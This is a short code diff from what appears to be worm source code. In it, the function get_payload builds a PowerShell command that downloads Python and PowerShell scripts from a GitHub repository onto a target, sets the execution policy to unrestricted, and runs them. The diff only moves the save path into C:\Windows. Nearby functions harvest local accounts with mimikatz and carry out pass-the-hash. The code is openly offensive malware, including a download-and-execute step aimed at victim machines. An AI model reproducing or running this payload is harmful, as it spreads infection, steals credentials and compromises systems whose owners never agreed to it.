@@ -248,7 +248,7 @@ def grab_local_accounts(mimikatz_path):
 
 # this is the command used to download the worm on the target
 def get_payload():
-    return r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\main.ps1''); Set-ExecutionPolicy unrestricted; cmd.exe CALL C:\Windows\main.bat; powershell.exe C:\main.ps1' """
+    return r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\Windows\main.ps1''); Set-ExecutionPolicy unrestricted; powershell.exe C:\Windows\main.ps1' """
 
 def passthehash():
     mimikatz = http_dl(MIMIKATZ_URL, cancel_if_file_exists=True)
